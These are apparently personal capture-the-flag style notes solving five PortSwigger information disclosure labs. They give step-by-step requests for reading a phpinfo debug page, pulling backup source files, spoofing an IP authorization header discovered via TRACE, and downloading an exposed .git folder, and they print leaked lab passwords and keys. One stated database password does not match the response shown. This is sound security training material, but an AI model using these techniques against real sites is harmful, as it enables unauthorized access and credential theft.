# Information disclosure vulnerabilities
https://portswigger.net/web-security/information-disclosure

<span style="color:yellow;font-weight:700;font-size:30px">
How to find and exploit information disclosure vulnerabilities
</span>
https://portswigger.net/web-security/information-disclosure/exploiting

hints:
/robots.txt
/sitemap.xml

# ***1. Lab: Information disclosure in error messages***

https://portswigger.net/web-security/information-disclosure/exploiting/lab-infoleak-in-error-messages

To solve the lab, obtain and submit the version number of this framework. 

fiddle with product request (GET /product?productId=1 HTTP/1.1):
enter an invalid number (like: blah)
get (HTTP/1.1 500 Internal Server Error) - see apache version in the response end

# LEAKED!

# ***2. Lab: Information disclosure on debug page***
https://portswigger.net/web-security/information-disclosure/exploiting/lab-infoleak-on-debug-page

To solve the lab, obtain and submit the SECRET_KEY environment variable. 

find site in Target tab and check all available pages. find hidden page (GET /cgi-bin/phpinfo.php HTTP/1.1)
send via repeater and observe response. 
search for keyword 'secret' and find the SECRET_KEY enviromental value:
u2gwtggfknnovlnuq1pp6v5bxn1zqzw5

# lEAKED!

# ***3. Lab: Source code disclosure via backup files***
https://portswigger.net/web-security/information-disclosure/exploiting/lab-infoleak-via-backup-files

To solve the lab, identify and submit the database password,

1. **request**:
```
GET /robots.txt HTTP/1.1
```
response:
```
Disallow: /backup

```
2. **request**:
```
GET /backup HTTP/1.1

```
response:
```htm
<a href='/backup/ProductTemplate.java.bak'>ProductTemplate.java.bak
```

3. **request**:
```
GET /backup/ProductTemplate.java.bak HTTP/1.1
```
response: 
```json
ConnectionBuilder connectionBuilder = ConnectionBuilder.from(
            "org.postgresql.Driver",
            "postgresql",
            "localhost",
            5432,
            "postgres",
            "postgres",
            "ucwisrtrnzmu9ss9tqd01g37cidfj3sf"
    )
```

postgres DB password = cauya7395fyj31fe8ueiuhrb7nj6eitb

# lEAKED!

# ***4. Lab: Authentication bypass via information disclosure***
https://portswigger.net/web-security/information-disclosure/exploiting/lab-infoleak-authentication-bypass

hint:
In the wild, the de-facto standard header X-Forwarded-For is often used

To solve the lab, obtain the header name then use it to bypass the lab's authentication. Access the admin interface and delete Carlos's account. 

scout target:
GET /admin HTTP/1.1
response:
    Admin interface only available to local users

we know server relys on IP range to allow/disallow access to admin panel

continue to scout with HTTP TRACE method:
	https://developer.mozilla.org/en-US/docs/Web/HTTP/Methods/TRACE
	https://portswigger.net/kb/issues/00500a00_http-trace-method-is-enabled

send TRACE request:
	TRACE /index.html HTTP/1.1

observe response reflects original message and adds additional header:
	X-Custom-IP-Authorization: 87.71.215.83

now we know the header the reverse proxy adds to each messege with its coresponding IP and we can use it to manipulation:

lets replace our IP with local IP:
X-Custom-IP-Authorization: 127.0.0.1

we get access to admin panel and delete carlos

method 2 - use match and replace:

# leaked



# ***5. Lab: Information disclosure in version control history***
https://portswigger.net/web-security/information-disclosure/exploiting/lab-infoleak-in-version-control-history

version control:
https://www.atlassian.com/git/tutorials/what-is-version-control



To solve the lab, obtain the password for the administrator user then log in and delete Carlos's account. 

try:
GET /.git HTTP/1.1
list og links

/.git/refs/heads
1bfb24d3e8fe66ec543e11caf9f0e8155053e880

/.git/COMMIT_EDITMSG
Remove admin password from config


/.git/logs/HEAD

0000000000000000000000000000000000000000 4d9f1f11ac9ea801b859f64e31c1b7b9e86bc75e Carlos Montoya <carlos@evil-user.net> 1657494505 +0000	commit (initial): Add skeleton admin panel
4d9f1f11ac9ea801b859f64e31c1b7b9e86bc75e 74a6dfd3ded64686ec4db14e68f9c837840e6424 Carlos Montoya <carlos@evil-user.net> 1657494505 +0000	commit: Remove admin password from config

learned:
file 4d9f1f11ac9ea801b859f64e31c1b7b9e86bc75e contains password that as removed in file 74a6dfd3ded64686ec4db14e68f9c837840e6424

we need to check the difference between them to find the removed password. best way is to use local git to search thrue version:

download git-cola (https://git-cola.github.io/downloads.html) freeware python based local git manager
debian install:
sudo apt-get install git-cola

download full .git folder with wget:
wget -r https://0af5007b04699fcbc02d747300d00074.web-security-academy.net/.git/ 


open git-cola in downloaded folder and see in admin.conf:
+ADMIN_PASSWORD=env('ADMIN_PASSWORD')

in Commit choose Undo last commit and get:
-ADMIN_PASSWORD=ejzczq6l2at31l2lyoaz
+ADMIN_PASSWORD=env('ADMIN_PASSWORD')

go to lab log in "administrator" with password "ejzczq6l2at31l2lyoaz"
delete carlos

# DUDE!





